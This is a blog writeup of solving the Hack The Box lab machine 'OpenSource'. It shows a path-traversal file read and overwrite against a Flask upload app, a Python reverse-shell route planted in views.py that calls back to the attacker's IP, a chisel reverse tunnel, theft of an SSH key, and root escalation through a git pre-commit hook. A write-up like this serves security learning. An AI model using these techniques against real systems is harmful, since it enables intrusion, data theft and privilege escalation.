---
layout: post
title: OpenSource - HTB Writeup
date: 2022-06-26 06:31:33.000000000 -05:00
categories: [Hackthebox]
tags: []
author: traysoncombs
permalink: "/opensource-htb.html"
---

![](/static/img/2022/06/OpenSource-1024x775.png)

## Enumeration

Doing a nmap scan of the site reveals the two normal ports of 80 and 22, as well as an interesting filtered port 3000 which may come in handy later.

```bash
$ nmap -sVC -T4 opensource.htb
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
```

Upon inspecting the site there are a couple of buttons, one takes me to a page where it appears files can be uploaded…. interesting.
Another button leads to a download of the source of said uploading service… even more interesting.

![](/static/img/2022/06/site-1024x722.png)

The downloaded source appears to be a git repo, maybe searching through old commits will yield some interesting information?
The repo appeared to contain two branches, public as well as dev. The public branch contained two commits neither of which are all that interesting.
Dev had a couple commits:

```bash
$ git log
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
```

After looking through them all one stuck out:

```bash
$ git diff a76f8f75f7a4a12b706b0cf9c983796fa1985820
[snipped for brevity]
--- a/app/.vscode/settings.json
+++ /dev/null
@@ -1,5 +0,0 @@
-{
-  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
-  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
-  "http.proxyStrictSSL": false
-}
```

Initially I glossed over this not thinking anything of it, but after a little inspection it's very obviously the URL for a proxy, with a username and password!

## Foothold

Alright now that we have creds, it time to find where we can use them.

To begin with I looked through the source code in hopes of finding some vulnerability.

```python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)

```

These two functions look pretty interesting, they search a string for any occurrence of ../ and deletes it from the string. It's pretty much a simple filter to prevent directory traversal and other similar vulnerabilities.

At first I thought I could simply bypass it using ..\ instead, but that didn't really work so instead I continued searching and within views.py I found this:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

So I originally discovered this through experimentation, but apparently if the os.path.join function is passed two absolute paths it will simply remove the previous ones in favor of the last one. For example if you run `os.path.join('/dev/null', blahblah, 'ahhhh','/home')` it will simply return /home. We can take advantage of this pretty easily by passing the absolute path of whatever file we want to download to the /uploads route.

Now to actually put this to use I had to do a little experiomentation and discovered that prepending ..%2f to whatever file I wanted to access worked best. For example:

```bash
$ curl opensource.htb/uploads/..%2f/etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin

[snipped]
```

The reason this works is because ..%2f is the url encoded version of ../, if we put that directly into the URL we will be redirected to the root directory of /. If we don't include it and just try and use a double slash we will be redirected to the single slash version of the URL. So I found it works best if we just let the filter strip out the ../ and leave a single slash.

Now we need to use this to do something useful.

Turns out we can use the same vulnerability to overwrite the python files that are running the server, and because the server is in debug mode, whatever we overwrite will patch the server.

We do this by changing the file name to the path of whatever file we want to patch, in this case ..//app/app/views.py, unfortunately we can't use directory separators in file names, so we simply fire up burp and modify the file name sent with the request.

![](/static/img/2022/06/burp-1024x341.png)

I simply added a python reverse shell under the /rev route.

```python
@app.route('/rev/<ip>/<port>')
def rev(ip, port):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,int(port)))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
```

From there I simply created a netcat listener and then went to: opensource.htb/<my IP>/4000.

```bash
$ nc -lvp 4000
listening on [any] 4000 ...
connect to [<my IP>] from opensource.htb [10.10.11.164] 59348
/app #
```

YEAHHH, we have a shell, unfortunately it's only a docker container but it's better then nothing. Now to find a way out.

## User

This is where that previously found filtered port 3000 comes in handy. Now that we've got a hand in their network we can proxy requests from our machine through the docker container and to port 3000. To do so there exists a cool little tool called [chisel](https://github.com/jpillora/chisel). I've used this tool in the past but I pretty much completely forgot how it works so I turned to the docs. Using this tool can get a little complicated so I'm not going to try and explain it here but how I used it was I ran a server in reverse mode on my machine by executing: `chisel server 8000 --reverse` then in the docker container I uploaded chisel and then ran: `./chisel client <my IP>:8000 R:3000:opensource.htb:3000`. This connects back to my machine, binds to localhost:3000, and sends any request to that port to opensource.htb:3000. Now I pointed my browser to localhost:3000 and was greeted with a gitea page.

![](/static/img/2022/06/gitea-1024x477.png)

And there's a place to login! Finally we can use those creds we found!

Upon logging in there is one repo, which is a backup of use dev01's home directory with the .ssh folder and beautiful private key included! After copying the key into my .ssh folder I was able to ssh in and grab the user flag without any issue!

```bash
dev01@opensource:~$ cat user.txt
e1883---------------------------------
```

## Root

Now that we have user it's time to do some enumeration and figure out what we're working with. First thing I noticed is that the home directory is actually a git repo (there is a .git directory). I ran `git log` to see if there were any interesting commits but there wasn't much. So keeping that in mind I moved on. I checked out all running processes by executing:

```bash
$ ps aux
[snipped]
root     21647  0.0  0.0  57508  3284 ?        S    17:03   0:00 /usr/sbin/CRON -f
root     21648  0.0  0.0   4636   832 ?        Ss   17:03   0:00 /bin/sh -c /usr/local/bin/git-sync
root     21649  0.0  0.0  11600  3324 ?        S    17:03   0:00 /bin/bash /usr/local/bin/git-sync
root     21657  0.0  0.1  17640  4056 ?        S    17:03   0:00 git push origin main
root     21658  0.0  0.2 182112  8176 ?        Sl   17:03   0:00 /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
dev01    21662  0.0  0.0  38380  3608 pts/0    R+   17:03   0:00 ps aux
```

There is one very interesting process being run by the root user, it appears to be located in /usr/local/bin and has something to do with git.

```bash
$ cat /usr/local/bin/git-sync
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

Upon reading the script it appears to check for any changes in dev01's home directory, and if detected adds any changed files, commits them, and pushes the changes. Luckily I have a little background knowledge on git and know that because the .git directory is world writeable we can add a hook that runs when something is committed, and because git is being run as root the hook will too.

To do this I simply added `cp /root/root.txt /tmp/spoilers && chmod 777 /tmp/spoilers` to `/home/dev01/.git/hooks/pre-commit`. I also could've added something to give me a root shell but I'm lazy and only care about getting the flag.

Now all we have to is add a file to the home directory and wait for the script to run.

```bash
$ touch pp
$ cat /tmp/spoilers
4fac5f8---------------------
```

Just like that the box is ours!

## Conclusion

This was the first box I've done in quite a while and it was very refreshing. It definitely wasn't the easiest box out there and it took quite some time to figure everything out but in the end it was very satisfying to finally finish it.
